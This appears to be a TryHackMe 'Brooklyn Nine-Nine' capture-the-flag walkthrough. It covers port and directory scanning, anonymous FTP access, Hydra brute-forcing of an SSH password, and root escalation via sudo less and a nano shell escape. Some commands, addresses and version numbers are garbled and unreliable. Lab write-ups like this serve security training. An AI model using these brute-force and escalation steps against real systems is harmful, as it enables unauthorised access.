\TryHackMe Brooklyn-Nine-Nine Walkthrough

First begin with nmapping the server once you've connected to identify the services and ports.

```bash

sudo nnap -T4 -sS -0 -Pn -sV 18.281.124.148
[sudo] password for malware:
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-03 17:22 -0700
Nmap scan report for 10.201.124.148 
Host is up (0.10s latency).
Not shown: 941 closed tcp ports (reset), 56 Filtered tcp ports (no-response)
PORT  STATE SERVICE VERSION
21/tcp open ftp     vsftpd 3.6.3
22/tcp open ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu8.3 (Ubuntu Linux; protocol 2.8) I
80/tcp open http    Apache httpd 2.4.29 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:Linux:linux_Kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops 
Service Info: 0Ss: Unix, Linux; CPE: cpe:/o:linux:linux_kerne

05 and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.82 seconds

```

Notice that port 21 (ftp) and port 22 (SSH) is open, keep these in mind. It will be useful.

In the meantime, let's take a look at the webserver. 

< 3. navigating to website >

Make sure you scroll all the way down.

< 4. text at the bottom of the webpage >

Let's see if we can extract any more information from this and run gobuster:

```bash

gobuster dir -u http://18.281.124.148 -w /usr/share/wordlists/dirb/common.txt
===================================================================
Gobuster v3.8.2
by 0J Reeves (@TheColonial) & Christian Mehlmaver (@firefart)
===================================================================
[+] Url:                    http://10.201.124.148
[+] Method:                 GET
[+] Threads:                10
[+] Wordlist:               /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:  404 I
[+] User Agent:             gobuster/3.8.2
[+] Timeout:                10s
===================================================================
Starting gobuster in directory enumeration mode
===================================================================
.htaccess                   (status: 403) [Size: 279]
.hta 3                      (status: 403) [Size: 279]
.htpasswd                   (status: 403) [Size: 279]
index.html                  (status: 200) [Size: 718]
server-status               (status: 403) [size: 279]
Progress: 4613 / 4613 (100.00%)
===================================================================
Finished
===================================================================

```

Let's backtrack a bit and see if we can log in via anonymous ftp:

ftp <server> --> user: anonymous password: anonymous

```bash

ftp <server>
Connected to <server>
220 (vsFTPd 3.0.3)
Name (<server:malware):anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

```
Looks like we have a successful sign on. Poke around and you'll find something called ```bash note_to_jake.txt ```

If we cat the contents of this note we find:

< 10. note to jake >

Okay, so we're working with a weak password, this might be something that Hydra can crack for us. 

Running the command:

```bash

hydra -l jake -P /usr/var/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -s 22 -t 4 -f -o jake_ssh_pass.txt ssh://<server>

```

Gives us this output.

< 15. running hydra against ssh jake >

After that we simply SSH into the machine via Jake's account:

< 16. successful ssh >

Running the command:

```bash 

pwd 

```
gives us:

```bash

/home/jake

```

if change directory one level and list the files we are given:

```bash

amy holt jake

```

changing directories to Holt's account and listing the files gives us:

```bash

nano.save user.txt

```

user.txt will contain the first flag

< 18. first flag >

Now that we have the user flag, we need to root the machine. 

Run the command:

```bash

sudo -l

```

This will list all the files that the user "Jake" has sudo permssions on:

```bash

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brooklyn_nine_nine:
	(ALL) NOPASSWD: /usr/bin/less

```

What does this mean for us? Well, we can get the root flag by simply running:

```bash

less root/root.txt

```
Otherwise if were in Holt's account we can priviledge escalate nano with:

```bash

sudo nano 

Ctrl+R , Ctrl+X - suspends the process

reset; sh 1>&0 2>&0 - executes as a root shell with nano

```

Congratulations you have finished the room!
